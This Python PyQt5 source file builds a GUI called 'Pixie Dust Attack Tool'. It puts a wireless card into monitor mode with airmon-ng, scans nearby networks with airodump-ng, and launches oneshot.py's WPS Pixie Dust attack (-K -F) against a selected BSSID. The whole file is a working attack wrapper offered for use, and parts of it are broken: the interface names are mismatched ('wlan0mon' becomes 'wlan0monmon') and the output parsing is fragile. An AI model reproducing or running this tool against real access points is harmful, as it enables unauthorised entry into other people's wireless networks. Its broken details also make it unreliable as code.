import sys
import subprocess
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QPushButton, QLabel, QTextEdit, QTableWidget, QTableWidgetItem, QFileDialog
)

class PixieDustGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("Pixie Dust Attack Tool")
        self.setGeometry(200, 200, 800, 600)

        layout = QVBoxLayout()

        self.label = QLabel("Pixie Dust Attack Tool", self)
        layout.addWidget(self.label)

        self.scan_btn = QPushButton("Scan Networks", self)
        self.scan_btn.clicked.connect(self.scan_networks)
        layout.addWidget(self.scan_btn)

        self.monitor_toggle_btn = QPushButton("Toggle Monitor Mode", self)
        self.monitor_toggle_btn.clicked.connect(self.toggle_monitor_mode)
        layout.addWidget(self.monitor_toggle_btn)

        self.network_table = QTableWidget(self)
        self.network_table.setColumnCount(5)
        self.network_table.setHorizontalHeaderLabels(["BSSID", "ESSID", "Channel", "Encryption", "Signal Strength"])
        self.network_table.setSelectionBehavior(QTableWidget.SelectRows)
        layout.addWidget(self.network_table)

        self.attack_btn = QPushButton("Start Pixie Dust Attack", self)
        self.attack_btn.clicked.connect(self.start_attack)
        layout.addWidget(self.attack_btn)

        self.save_results_btn = QPushButton("Save Results", self)
        self.save_results_btn.clicked.connect(self.save_results)
        layout.addWidget(self.save_results_btn)

        self.output = QTextEdit(self)
        self.output.setReadOnly(True)
        layout.addWidget(self.output)

        self.setLayout(layout)

    def toggle_monitor_mode(self):
        try:
            interface = "wlan0"  # Replace with your wireless interface
            self.output.append(f"Toggling monitor mode for interface {interface}...")

            # Check current interface mode
            check_mode = subprocess.check_output(["iwconfig", interface], text=True)
            if "Mode:Monitor" in check_mode:
                self.output.append("Interface is already in monitor mode.")
                return

            # Toggle monitor mode
            subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
            self.output.append(f"Interface {interface} set to monitor mode.")
        except subprocess.CalledProcessError as e:
            self.output.append(f"Error enabling monitor mode: {e}")

    def scan_networks(self):
        self.output.append("Scanning networks... Please wait.")

        try:
            interface = "wlan0mon"  # Ensure you're using monitor mode interface
            subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)

            # Run `airodump-ng` to capture networks
            scan_command = ["sudo", "airodump-ng", f"{interface}mon"]
            process = subprocess.Popen(scan_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            self.network_table.setRowCount(0)  # Clear table before scanning

            # Parse the output to extract BSSID, ESSID, Channel, Encryption, Signal Strength
            for line in process.stdout:
                if "BSSID" in line or "Station" in line:
                    continue

                parts = line.split()
                if len(parts) >= 15:  # Ensure enough data for network details
                    bssid = parts[0]
                    channel = parts[1]
                    essid = " ".join(parts[13:])
                    encryption = parts[4] if len(parts) > 4 else "None"
                    signal_strength = parts[8] if len(parts) > 8 else "N/A"
                    row_position = self.network_table.rowCount()
                    self.network_table.insertRow(row_position)
                    self.network_table.setItem(row_position, 0, QTableWidgetItem(bssid))
                    self.network_table.setItem(row_position, 1, QTableWidgetItem(essid))
                    self.network_table.setItem(row_position, 2, QTableWidgetItem(channel))
                    self.network_table.setItem(row_position, 3, QTableWidgetItem(encryption))
                    self.network_table.setItem(row_position, 4, QTableWidgetItem(signal_strength))

            process.wait()
            self.output.append("Network scan complete.")
        except Exception as e:
            self.output.append(f"Error during scan: {e}")

    def save_results(self):
        # Open file dialog to save the file
        file_dialog = QFileDialog(self)
        file_path, _ = file_dialog.getSaveFileName(self, "Save Results", "", "Text Files (*.txt);;All Files (*)")
        
        if file_path:
            try:
                with open(file_path, "w") as file:
                    # Write column headers
                    file.write("BSSID\tESSID\tChannel\tEncryption\tSignal Strength\n")
                    
                    # Write network data from the table
                    for row in range(self.network_table.rowCount()):
                        bssid = self.network_table.item(row, 0).text()
                        essid = self.network_table.item(row, 1).text()
                        channel = self.network_table.item(row, 2).text()
                        encryption = self.network_table.item(row, 3).text()
                        signal_strength = self.network_table.item(row, 4).text()

                        file.write(f"{bssid}\t{essid}\t{channel}\t{encryption}\t{signal_strength}\n")

                self.output.append(f"Results saved to {file_path}")
            except Exception as e:
                self.output.append(f"Error saving results: {e}")

    def start_attack(self):
        # Get selected row's data
        selected_row = self.network_table.currentRow()
        if selected_row == -1:
            self.output.append("Error: Please select a network from the list.")
            return

        bssid = self.network_table.item(selected_row, 0).text()
        channel = self.network_table.item(selected_row, 2).text()

        if not bssid or not channel:
            self.output.append("Error: Invalid BSSID or Channel selected.")
            return

        self.output.append(f"Starting Pixie Dust attack on BSSID: {bssid}, Channel: {channel}")

        try:
            # Display WPS handshake info
            self.output.append(f"Attempting to capture WPS handshake for BSSID: {bssid} on channel: {channel}")
            
            # Use `oneshot.py` for the attack
            attack_command = [
                "python3", "/path/to/oneshot.py",  # Replace with the correct path
                "-b", bssid,
                "-i", "wlan0",
                "-K",
                "-F"
            ]
            process = subprocess.Popen(attack_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            for line in process.stdout:
                # Update output window with each line received during the attack
                self.output.append(line.strip())

            # Handle errors from the process
            for line in process.stderr:
                self.output.append(f"Error: {line.strip()}")

            process.wait()

            # Handle results after the attack
            if process.returncode == 0:
                self.output.append("Pixie Dust attack finished successfully.")
            else:
                self.output.append("Error: Pixie Dust attack failed.")
        except FileNotFoundError:
            self.output.append("Error: oneshot.py not found. Please ensure it is installed and the path is correct.")
        except Exception as e:
            self.output.append(f"Error during attack: {e}")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = PixieDustGUI()
    window.show()
    sys.exit(app.exec_())
